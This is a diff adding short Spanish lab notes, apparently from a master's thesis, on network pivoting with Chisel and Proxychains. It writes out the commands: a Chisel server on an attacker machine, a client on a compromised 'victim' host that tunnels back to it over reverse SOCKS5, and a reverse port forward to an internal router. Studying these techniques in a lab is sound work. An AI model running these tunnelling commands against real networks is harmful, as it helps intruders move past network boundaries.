@@ -1,0 +1,17 @@
+# TFM - Fase 2 & 4: Pivoting y Evasión de Red
+# Herramientas: Chisel, Proxychains
+
+### 1. Configuración del Túnel SOCKS5 (Reverse Tunnel)
+# En la máquina atacante (Kali):
+./chisel server -p 8000 --socks5
+
+# En la máquina víctima (Pivote - Ubuntu):
+./chisel client 192.168.10.133:8000 socks
+
+### 2. Configuración de Proxychains (/etc/proxychains4.conf)
+# Enrutamiento dinámico a través del puerto local abierto por Chisel
+socks5 127.0.0.1 1080
+
+### 3. Port Forwarding para RDP (Salto al Router)
+# Redirigir puerto local 8081 al puerto 80 del Router interno (192.168.20.1)
+./chisel client 192.168.10.133:8000 R:8081:192.168.20.1:80
